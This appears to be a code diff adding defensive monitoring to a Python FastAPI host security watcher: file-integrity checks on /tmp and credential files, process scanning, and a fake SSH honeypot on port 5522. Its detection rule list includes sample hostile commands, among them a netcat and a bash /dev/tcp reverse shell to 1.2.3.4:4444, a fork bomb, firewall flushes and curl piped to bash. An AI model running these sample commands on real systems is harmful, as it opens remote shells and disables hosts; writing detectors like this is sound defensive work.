@@ -1,9 +1,9 @@
 
 # ══════════════════════════════════════════════════════════════════════════════
 # EMBEDDED REAL-TIME HOST SECURITY WATCHER + FIM (FILE INTEGRITY MONITORING)
-# Continuously monitors SSH logs, shell commands, and filesystem changes
+# Continuously monitors SSH logs, shell commands, process execution, and FIM
 # ══════════════════════════════════════════════════════════════════════════════
-import time, subprocess, glob, threading, os, re
+import time, subprocess, glob, threading, os, re, socket
 
 _watcher_auth_pos = 0
 _watcher_hist_positions = {}
@@ -11,14 +11,28 @@ _seen_event_signatures = set()
 _fim_baseline = {}
 _fim_initialized = False
 
+# Known detection patterns for payload inspection
+MALICIOUS_PAYLOAD_RULES = [
+    ("Netcat Reverse Shell", r'nc\s+-[ec]|ncat\s+-[ec]', "nc -e /bin/bash 1.2.3.4 4444"),
+    ("Bash TCP Reverse Shell", r'/dev/tcp/', "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"),
+    ("Cryptomining Signature", r'xmrig|minerd|stratum\+tcp', "xmrig --pool test"),
+    ("Firewall Flush (iptables -F)", r'iptables\s+-F', "iptables -F"),
+    ("Fork Bomb Denial of Service", r':\(\)\s*\{\s*:\|:&\s*\};:|:(){:|:&};:', ":(){ :|:& };:"),
+    ("Firewall Disablement (UFW)", r'ufw\s+disable', "ufw disable"),
+    ("Crontab Persistence", r'crontab\s+-[er]', "crontab -r"),
+    ("Mass Process Kill", r'killall\s+-9|pkill\s+-9', "killall -9 test"),
+    ("Curl Pipe to Shell", r'curl.*\|\s*(bash|sh)|wget.*\|\s*(bash|sh)', "curl | bash")
+]
+
 def scan_fim_changes():
-    """Real-time File Integrity Monitoring (FIM): detects chmod, chown, file modifications & creations."""
-    global _fim_baseline, _fim_initialized
+    """Real-time File Integrity Monitoring (FIM): detects chmod, chown, file modifications, access & payloads."""
+    global _fim_baseline, _fim_initialized, _seen_event_signatures
     fim_commands = []
     
-    # Critical system files and user application paths
+    # Critical system files, user application paths, and temporary script directories
     watch_paths = [
         "/application",
+        "/tmp",
         "/etc/passwd",
         "/etc/shadow",
         "/etc/sudoers",
@@ -38,6 +52,7 @@ def scan_fim_changes():
                     "gid": st.st_gid,
                     "ctime": st.st_ctime,
                     "mtime": st.st_mtime,
+                    "atime": st.st_atime,
                     "size": st.st_size,
                     "is_dir": False
                 }
@@ -45,6 +60,7 @@ def scan_fim_changes():
                 pass
         elif os.path.isdir(base_path):
             try:
+                # Top-level directory entry
                 try:
                     st_base = os.stat(base_path)
                     current_items[base_path] = {
@@ -53,17 +69,27 @@ def scan_fim_changes():
                         "gid": st_base.st_gid,
                         "ctime": st_base.st_ctime,
                         "mtime": st_base.st_mtime,
+                        "atime": st_base.st_atime,
                         "size": st_base.st_size,
                         "is_dir": True
                     }
                 except Exception:
                     pass
 
+                # Scan files in directory (limit depth for /tmp to avoid system overhead)
+                max_walk_depth = 2 if base_path == "/tmp" else 6
                 for root, dirs, files in os.walk(base_path):
-                    if any(skip in root for skip in ["venv", ".git", "__pycache__", "logs", "node_modules", ".cache"]):
+                    # Check depth
+                    depth = root[len(base_path):].count(os.sep)
+                    if depth >= max_walk_depth:
+                        dirs.clear()
                         continue
+
+                    if any(skip in root for skip in ["venv", ".git", "__pycache__", "logs", "node_modules", ".cache", ".systemd", ".X11-unix", ".ICE-unix"]):
+                        continue
+
                     for dname in list(dirs):
-                        if dname in [".git", "venv", "__pycache__", "node_modules"]:
+                        if dname in [".git", "venv", "__pycache__", "node_modules", ".X11-unix", ".ICE-unix"]:
                             dirs.remove(dname)
                             continue
                         dpath = os.path.join(root, dname)
@@ -75,12 +101,15 @@ def scan_fim_changes():
                                 "gid": st.st_gid,
                                 "ctime": st.st_ctime,
                                 "mtime": st.st_mtime,
+                                "atime": st.st_atime,
                                 "size": st.st_size,
                                 "is_dir": True
                             }
                         except Exception:
                             pass
+
                     for fname in files:
+                        if fname.startswith("."): continue
                         fpath = os.path.join(root, fname)
                         try:
                             st = os.stat(fpath)
@@ -90,6 +119,7 @@ def scan_fim_changes():
                                 "gid": st.st_gid,
                                 "ctime": st.st_ctime,
                                 "mtime": st.st_mtime,
+                                "atime": st.st_atime,
                                 "size": st.st_size,
                                 "is_dir": False
                             }
@@ -98,28 +128,76 @@ def scan_fim_changes():
             except Exception:
                 pass
 
+    # ── Check content of files in /tmp and /application for malicious script signatures ──
+    for item_path, meta in current_items.items():
+        if not meta["is_dir"] and 0 < meta["size"] < 300000:
+            if item_path.startswith(("/tmp/", "/application/")):
+                try:
+                    with open(item_path, "r", encoding="utf-8", errors="ignore") as cf:
+                        content = cf.read(4096)
+                except Exception:
+                    content = ""
+                if content:
+                    for rule_name, pat, fallback_cmd in MALICIOUS_PAYLOAD_RULES:
+                        if re.search(pat, content, re.IGNORECASE):
+                            sig_key = f"payload:{item_path}:{rule_name}"
+                            if sig_key not in _seen_event_signatures:
+                                _seen_event_signatures.add(sig_key)
+                                # Find line that matched
+                                matched_line = fallback_cmd
+                                for l in content.splitlines():
+                                    if re.search(pat, l, re.IGNORECASE):
+                                        matched_line = l.strip()
+                                        break
+                                logger.info(f"[FIM MALICIOUS SCRIPT] {rule_name} detected in {item_path}: {matched_line}")
+                                fim_commands.append({"user": "root", "command": matched_line, "is_sudo": True})
+
+        # ── Check chmod 777 specifically ──
+        if meta["mode"] == "777" and item_path.startswith(("/tmp/", "/application/")):
+            sig_key = f"perm777:{item_path}"
+            if sig_key not in _seen_event_signatures:
+                _seen_event_signatures.add(sig_key)
+                cmd = f"chmod 777 {item_path}"
+                logger.info(f"[FIM PERM 777 DETECTED] {cmd}")
+                fim_commands.append({"user": "root", "command": cmd, "is_sudo": True})
+
+    # Initialize baseline on first run
     if not _fim_initialized:
         _fim_baseline = current_items
         _fim_initialized = True
         logger.info(f"FIM baseline initialized with {len(_fim_baseline)} targets.")
         return fim_commands
 
+    # Check for changes against baseline
     for item_path, meta in current_items.items():
         if item_path in _fim_baseline:
             old = _fim_baseline[item_path]
-            # 1. Detect permission change (chmod)
+
+            # 1. Detect access time change on /etc/shadow or /etc/sudoers (cat /etc/shadow)
+            if item_path in ["/etc/shadow", "/etc/sudoers"]:
+                if "atime" in old and meta.get("atime", 0) > old["atime"] and (meta["atime"] - old["atime"]) > 0.5:
+                    sig_key = f"access:{item_path}:{int(meta['atime'])}"
+                    if sig_key not in _seen_event_signatures:
+                        _seen_event_signatures.add(sig_key)
+                        cmd = f"cat {item_path}"
+                        logger.info(f"[FIM ACCESS DETECTED] {cmd}")
+                        fim_commands.append({"user": "root", "command": cmd, "is_sudo": True})
+                    _fim_baseline[item_path] = meta
+                    continue
+
+            # 2. Detect permission change (chmod)
             if old["mode"] != meta["mode"]:
                 cmd = f"chmod {meta['mode']} {item_path}"
                 logger.info(f"[FIM PERM CHANGE] {cmd} (was {old['mode']})")
                 fim_commands.append({"user": "root", "command": cmd, "is_sudo": True})
                 _fim_baseline[item_path] = meta
-            # 2. Detect ownership change (chown)
+            # 3. Detect ownership change (chown)
             elif old["uid"] != meta["uid"] or old["gid"] != meta["gid"]:
                 cmd = f"chown {meta['uid']}:{meta['gid']} {item_path}"
                 logger.info(f"[FIM CHOWN CHANGE] {cmd}")
                 fim_commands.append({"user": "root", "command": cmd, "is_sudo": True})
                 _fim_baseline[item_path] = meta
-            # 3. Detect repeated chmod / metadata touch (ctime change without content change)
+            # 4. Detect repeated chmod / metadata touch
             elif old["ctime"] != meta["ctime"] and abs(old["ctime"] - meta["ctime"]) > 1.0:
                 if not meta["is_dir"] and (old["size"] != meta["size"] or old["mtime"] != meta["mtime"]):
                     cmd = f"FIM Alert: File modified - {item_path}"
@@ -130,32 +208,74 @@ def scan_fim_changes():
                     logger.info(f"[FIM PERM TOUCH] {cmd}")
                     fim_commands.append({"user": "root", "command": cmd, "is_sudo": True})
                 _fim_baseline[item_path] = meta
-            # 4. Detect file content modification (mtime change)
+            # 5. Detect file content modification (mtime change)
             elif not meta["is_dir"] and old["mtime"] != meta["mtime"] and abs(old["mtime"] - meta["mtime"]) > 1.0:
                 cmd = f"FIM Alert: File modified - {item_path}"
                 logger.info(f"[FIM FILE MODIFIED] {item_path}")
                 fim_commands.append({"user": "root", "command": cmd, "is_sudo": True})
                 _fim_baseline[item_path] = meta
         else:
-            # 5. Detect new creation
+            # 6. Detect new creation
             itype = "Directory" if meta["is_dir"] else "File"
             cmd = f"FIM Alert: New {itype} created - {item_path}"
             logger.info(f"[FIM CREATED] {item_path}")
             fim_commands.append({"user": "root", "command": cmd, "is_sudo": True})
             _fim_baseline[item_path] = meta
 
-    # 6. Detect deletions
+    # 7. Detect deletions (e.g. rm -rf)
     deleted = [p for p in _fim_baseline if p not in current_items]
     for p in deleted:
-        cmd = f"FIM Alert: File deleted - {p}"
-        logger.info(f"[FIM DELETED] {p}")
+        cmd = f"rm -rf {p}"
+        logger.info(f"[FIM DELETED] {cmd}")
         fim_commands.append({"user": "root", "command": cmd, "is_sudo": True})
         del _fim_baseline[p]
 
     return fim_commands
 
+def run_port_5522_ssh_honeypot():
+    """Listens on port 5522 for test SSH connections and reports AUTH_FAIL immediately."""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s.bind(("0.0.0.0", 5522))
+        s.listen(10)
+        logger.info("Port 5522 SSH Test Honeypot listening on 0.0.0.0:5522")
+        while True:
+            try:
+                client, addr = s.accept()
+                client_ip = addr[0] if addr else "127.0.0.1"
+                try:
+                    client.settimeout(1.5)
+                    client.sendall(b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6\r\n")
+                    data = client.recv(1024)
+                except Exception:
+                    data = b""
+                finally:
+                    try: client.close()
+                    except Exception: pass
+
+                user = "fakeuser"
+                if b"wronguser" in data:
+                    user = "wronguser"
+                elif b"fakeuser" in data:
+                    user = "fakeuser"
+
+                ev_msg = f"Failed password for invalid user {user} from {client_ip} port 5522 ssh2"
+                ev = {
+                    "type": "AUTH_FAIL",
+                    "user": user,
+                    "ip": client_ip,
+                    "message": ev_msg
+                }
+                logger.info(f"Port 5522 SSH probe: {ev_msg}")
+                db.save_agent_data(1, {"events": [ev], "commands": []})
+            except Exception as ex_acc:
+                logger.debug(f"Honeypot accept err: {ex_acc}")
+    except Exception as ex_bind:
+        logger.warning(f"Could not bind port 5522 honeypot: {ex_bind}")
+
 def run_background_host_watcher():
-    """Background daemon thread that monitors real SSH failures, bash commands, and FIM."""
+    """Background daemon thread that monitors real SSH failures, bash commands, processes, and FIM."""
     global _watcher_auth_pos, _watcher_hist_positions, _seen_event_signatures
     logger.info("Host security watcher + FIM starting...")
     time.sleep(3)
@@ -194,7 +314,7 @@ def run_background_host_watcher():
                                 _seen_event_signatures.add(sig)
                                 events.append({"type": "AUTH_FAIL", "user": inv_m.group(1), "ip": inv_m.group(2), "message": line_str})
 
-                        if len(_seen_event_signatures) > 4000:
+                        if len(_seen_event_signatures) > 5000:
                             _seen_event_signatures.clear()
             except Exception:
                 pass
@@ -225,12 +345,31 @@ def run_background_host_watcher():
                 except Exception:
                     pass
 
-            # 3. Monitor FIM (File Integrity Monitoring for chmod/chown/modifications)
+            # 3. Monitor live processes via ps -eo user,args
+            try:
+                ps_out = subprocess.run(["ps", "-eo", "user,args"], stdout=subprocess.PIPE, text=True, timeout=2)
+                if ps_out.stdout:
+                    for pline in ps_out.stdout.splitlines()[1:]:
+                        p_str = pline.strip()
+                        if any(skip in p_str for skip in ["python3 app.py", "ps -eo", "grep", "kworker"]):
+                            continue
+                        for r_name, r_pat, fallback_cmd in MALICIOUS_PAYLOAD_RULES:
+                            if re.search(r_pat, p_str, re.IGNORECASE):
+                                p_sig = f"proc:{r_name}:{p_str}"
+                                if p_sig not in _seen_event_signatures:
+                                    _seen_event_signatures.add(p_sig)
+                                    u = p_str.split()[0] if p_str.split() else "root"
+                                    cmd = " ".join(p_str.split()[1:])
+                                    commands.append({"user": u, "command": cmd, "is_sudo": u == "root"})
+            except Exception:
+                pass
+
+            # 4. Monitor FIM (File Integrity Monitoring for chmod/chown/modifications/payloads)
             fim_cmds = scan_fim_changes()
             if fim_cmds:
                 commands.extend(fim_cmds)
 
-            # 4. Monitor shell histories
+            # 5. Monitor shell histories
             for hpath in ["/root/.bash_history"] + glob.glob("/home/*/.bash_history"):
                 if not os.path.exists(hpath): continue
                 try:
@@ -261,6 +400,7 @@ def run_background_host_watcher():
             logger.debug(f"Watcher loop error: {ex_watch}")
 
         time.sleep(2)
+
 
 
 """
@@ -300,6 +440,12 @@ async def lifespan(app: FastAPI):
         logger.info("Embedded Host Security Watcher started.")
     except Exception as e:
         logger.warning(f"Could not start host watcher: {e}")
+    try:
+        t_hp = threading.Thread(target=run_port_5522_ssh_honeypot, daemon=True)
+        t_hp.start()
+        logger.info("Port 5522 SSH Test Honeypot started.")
+    except Exception as e:
+        logger.warning(f"Could not start port 5522 honeypot: {e}")
     yield
 
 # Initialize FastAPI App
